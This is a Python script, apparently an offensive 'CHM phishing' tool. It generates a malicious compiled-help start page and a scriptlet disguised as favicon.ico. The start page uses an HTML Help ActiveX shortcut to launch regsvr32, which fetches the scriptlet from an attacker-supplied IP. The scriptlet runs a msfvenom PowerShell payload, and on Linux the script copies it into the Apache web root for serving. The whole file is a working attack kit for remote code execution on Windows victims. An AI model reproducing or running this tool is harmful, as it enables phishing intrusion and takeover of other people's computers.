'''
#author:九世
#time:2019/1/27
'''

import os
import platform

class Chm:
    def __init__(self,payload,payload2):
        self.payload=payload
        self.payload2=payload2

    def remed(self):
        systems=platform.system()
        if systems=="Windows":
            id=1
            print('[!] system:{}'.format(systems))
        elif systems=="Linux":
            print('[!] system:{}'.format(systems))
            id=2

        self.shengchen(id)
    def shengchen(self,id):
        xj=open('file/start.html','w')
        xj.close()
        xj2=open('file/favicon.ico','w')
        xj2.close()
        print(self.payload,file=open('file/start.html','a'))
        print(self.payload2,file=open('file/favicon.ico','a'))
        self.panduan(id)
    def panduan(self,id):
        if id==2:
            if os.path.exists('file/start.html'):
                print('[+] Found start.html')
            else:
                print('[-] Not Found start.html')

            if os.path.exists('file/favicon.ico'):
                print('[+] Found favicon.ico')
                os.system('mv file/favicon.ico /var/www/html')
                print('[+] Found Apache /var/www/html')
            else:
                print('[-] Not Found favicon.ico')

        else:
            if os.path.exists('file/start.html'):
                print('[+] Found start.html')
            else:
                print('[-] Not Found start.html')

            if os.path.exists('file/favicon.ico'):
                print('[+] Found favicon.ico')
            else:
                print('[-] Not Found favicon.ico')

if __name__ == '__main__':
    print('[+] Chm fishing research:https://422926799.github.io/2019/01/27/Chm-fishing/\n[+] This tool will be used under Linux to move the automatically generated fanvicon.ico to /var/www/html\n[+] The first one will let you enter the IP of the attacker, and the second will input the powershell payload generated by msfvenom.')
    user=input('attack_IP:')
    user2=input('msfvenom_powershell_exp:')
    attack_payload='''<!DOCTYPE html><html><head><title>Mousejack replay</title><head></head><body>
command exec 
<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
<PARAM name="Command" value="ShortCut">
 <PARAM name="Button" value="Bitmap::shortcut">
 <PARAM name="Item1" value=',regsvr32.exe,/u /n /s /i:http://{}/favicon.ico scrobj.dll'>
 <PARAM name="Item2" value="273,1,1">
</OBJECT>
<SCRIPT>
x.Click();
</SCRIPT>
</body></html>
    '''.format(user)


    sou_payload="""
<?XML version="1.0"?>
<scriptlet>
<registration
    progid="ShortJSRAT"
    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
    <!-- Learn from Casey Smith @subTee -->
    <script language="JScript">
        <![CDATA[
        """+""""
            ps1  = "{}";
            $shell=new ActiveXObject("WScript.Shell")
            $shell.Run(ps1,0,true);
        ]]>
</script>
</registration>
</scriptlet>
    
    
    """.format(user2)
    obj=Chm(payload=attack_payload,payload2=sou_payload)
    obj.remed()